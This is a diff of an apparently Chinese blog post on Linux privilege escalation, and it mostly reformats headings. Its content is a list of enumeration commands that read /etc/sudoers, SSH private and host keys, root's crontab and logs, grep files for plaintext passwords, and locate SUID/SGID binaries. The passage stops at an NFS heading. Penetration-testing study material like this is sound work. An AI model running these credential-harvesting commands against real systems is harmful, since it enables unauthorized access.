@@ -11,7 +11,7 @@
   <meta itemprop="name" content="权限提升-linux">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="1064">
+  <meta itemprop="wordCount" content="1002">
   <meta itemprop="keywords" content="攻防,提权,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/linux/50/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="权限提升-linux">
@@ -38,7 +38,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/linux\/50\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 提权, 内网渗透","wordcount":  1064 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 提权, 内网渗透","wordcount":  1002 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/linux\/50\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -145,7 +145,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>权限提升-Linux</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1064 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1100 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1002 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1100 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>5 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -159,13 +159,25 @@
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li><a href="#cve">cve</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#示例1">示例1</a></li>
+    <li><a href="#示例2">示例2</a></li>
+  </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="命令" class="heading-element"><span>0.0.0.1  命令</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="命令" class="heading-element"><span>命令</span>
   <a href="#%e5%91%bd%e4%bb%a4" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>######### 内核，操作系统，设备信息</p>
-<pre tabindex="0"><code>uname -a    打印所有可用的系统信息
+</h1><h5 id="内核操作系统设备信息" class="heading-element"><span>内核，操作系统，设备信息</span>
+  <a href="#%e5%86%85%e6%a0%b8%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e8%ae%be%e5%a4%87%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>uname -a    打印所有可用的系统信息
 uname -r    内核版本
 uname -n    系统主机名。
 uname -m    查看系统内核架构（64位/32位）
@@ -176,12 +188,18 @@ cat /etc/issue       分发信息
 cat /proc/cpuinfo    CPU信息
 cat /etc/lsb-release # Debian 
 cat /etc/redhat-release # Redhat
-ls /boot | grep vmlinuz-</code></pre><p>######### 用户权限信息</p>
-<pre tabindex="0"><code>whoami        当前用户名
+ls /boot | grep vmlinuz-</code></pre><h5 id="用户权限信息" class="heading-element"><span>用户权限信息</span>
+  <a href="#%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>whoami        当前用户名
 id            当前用户信息
 cat /etc/sudoers  谁被允许以root身份执行
-sudo -l       当前用户可以以root身份执行操作</code></pre><p>######### 环境信息</p>
-<pre tabindex="0"><code>env        显示环境变量
+sudo -l       当前用户可以以root身份执行操作</code></pre><h5 id="环境信息" class="heading-element"><span>环境信息</span>
+  <a href="#%e7%8e%af%e5%a2%83%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>env        显示环境变量
 set        现实环境变量
 echo %PATH 路径信息
 history    显示当前用户的历史命令记录
@@ -191,16 +209,25 @@ cat /etc/shells    显示可用的shellrc
 cat /etc/bashrc
 cat ~/.bash_profile
 cat ~/.bashrc
-cat ~/.bash_logout</code></pre><p>######### 进程和服务</p>
-<pre tabindex="0"><code>ps aux
+cat ~/.bash_logout</code></pre><h5 id="进程和服务" class="heading-element"><span>进程和服务</span>
+  <a href="#%e8%bf%9b%e7%a8%8b%e5%92%8c%e6%9c%8d%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>ps aux
 ps -ef
 top
-cat /etc/services</code></pre><p>########## 查看安装的软件</p>
-<pre tabindex="0"><code>ls -alh /usr/bin/
+cat /etc/services</code></pre><h6 id="查看安装的软件" class="heading-element"><span>查看安装的软件</span>
+  <a href="#%e6%9f%a5%e7%9c%8b%e5%ae%89%e8%a3%85%e7%9a%84%e8%bd%af%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><pre tabindex="0"><code>ls -alh /usr/bin/
 ls -alh /sbin/
 ls -alh /var/cache/yum/
-dpkg -l</code></pre><p>######### 服务和插件</p>
-<pre tabindex="0"><code>cat /etc/syslog.conf
+dpkg -l</code></pre><h5 id="服务和插件" class="heading-element"><span>服务和插件</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e5%92%8c%e6%8f%92%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>cat /etc/syslog.conf
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
 cat /etc/cups/cupsd.conf
@@ -209,8 +236,11 @@ cat /etc/apache2/apache2.conf
 cat /etc/my.conf
 cat /etc/httpd/conf/httpd.conf
 cat /opt/lampp/etc/httpd.conf
-ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</code></pre><p>######### 计划任务</p>
-<pre tabindex="0"><code>crontab -l
+ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</code></pre><h5 id="计划任务" class="heading-element"><span>计划任务</span>
+  <a href="#%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
 ls -al /etc/cron*
@@ -221,12 +251,18 @@ cat /etc/cron.allow
 cat /etc/cron.deny
 cat /etc/crontab
 cat /etc/anacrontab
-cat /var/spool/cron/crontabs/root</code></pre><p>######### 　是否有存放明文密码</p>
-<pre tabindex="0"><code>grep -i user [filename]
+cat /var/spool/cron/crontabs/root</code></pre><h5 id="是否有存放明文密码" class="heading-element"><span>　是否有存放明文密码</span>
+  <a href="#%e6%98%af%e5%90%a6%e6%9c%89%e5%ad%98%e6%94%be%e6%98%8e%e6%96%87%e5%af%86%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 &#34;password&#34; [filename]
-find , -name &#34;*.php&#34; -print0 | xargs -0 grep -i -n &#34;var $password&#34;</code></pre><p>######### ssh私钥信息</p>
-<pre tabindex="0"><code>cat ~/.ssh/authorized_keys
+find , -name &#34;*.php&#34; -print0 | xargs -0 grep -i -n &#34;var $password&#34;</code></pre><h5 id="ssh私钥信息" class="heading-element"><span>ssh私钥信息</span>
+  <a href="#ssh%e7%a7%81%e9%92%a5%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
 cat ~/.ssh/id_rsa.pub
@@ -240,8 +276,11 @@ cat /etc/ssh/ssh_host_dsa_key
 cat /etc/ssh/ssh_host_rsa_key.pub
 cat /etc/ssh/ssh_host_rsa_key
 cat /etc/ssh/ssh_host_key.pub
-cat /etc/ssh/ssh_host_key</code></pre><p>######### 查看与主机通信的信息</p>
-<pre tabindex="0"><code>lsof -i
+cat /etc/ssh/ssh_host_key</code></pre><h5 id="查看与主机通信的信息" class="heading-element"><span>查看与主机通信的信息</span>
+  <a href="#%e6%9f%a5%e7%9c%8b%e4%b8%8e%e4%b8%bb%e6%9c%ba%e9%80%9a%e4%bf%a1%e7%9a%84%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>lsof -i
 lsof -i :80
 grep 80 /etc/services
 netstat -anptl
@@ -251,8 +290,11 @@ netstat -tulpn
 chkconfig --list
 chkconfig --list | grep 3:on
 last
-w</code></pre><p>######### 日志信息</p>
-<pre tabindex="0"><code>cat /var/log/boot.log
+w</code></pre><h5 id="日志信息" class="heading-element"><span>日志信息</span>
+  <a href="#%e6%97%a5%e5%bf%97%e4%bf%a1%e6%81%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>cat /var/log/boot.log
 cat /var/log/cron
 cat /var/log/syslog
 cat /var/log/wtmp
@@ -296,36 +338,42 @@ ls -alh /var/log/postgresql/
 ls -alh /var/log/proftpd/
 ls -alh /var/log/samba/
 
-Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre><p>######### 查看可提权的SUID或GUID</p>
-<pre tabindex="0"><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre><h5 id="查看可提权的suid或guid" class="heading-element"><span>查看可提权的SUID或GUID</span>
+  <a href="#%e6%9f%a5%e7%9c%8b%e5%8f%af%e6%8f%90%e6%9d%83%e7%9a%84suid%e6%88%96guid" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
 find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
 find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
 
 find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
 for i in `locate -r &#34;bin$&#34;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
 
-##### find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></pre><p>######### 查看可写/执行目录</p>
-<pre tabindex="0"><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</code></pre><h5 id="查看可写执行目录" class="heading-element"><span>查看可写/执行目录</span>
+  <a href="#%e6%9f%a5%e7%9c%8b%e5%8f%af%e5%86%99%e6%89%a7%e8%a1%8c%e7%9b%ae%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><pre tabindex="0"><code>find / -writable -type d 2&gt;/dev/null      # world-writeable folders
 find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders
 find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders
 
 find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders
 
-find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h5 id="suidguid" class="heading-element"><span>0.0.0.2  suid&amp;guid</span>
+find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h1 id="suidguid" class="heading-element"><span>suid&amp;guid</span>
   <a href="#suidguid" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>原因：</p>
+</h1><p>原因：</p>
 <ul>
 <li><code>chmod u+s</code>赋予了suid</li>
 <li>被赋予suid的工具可以执行命令或者其他危害</li>
 </ul>
-<h5 id="nfs" class="heading-element"><span>0.0.0.3  nfs</span>
+<h1 id="nfs" class="heading-element"><span>nfs</span>
   <a href="#nfs" class="heading-mark">
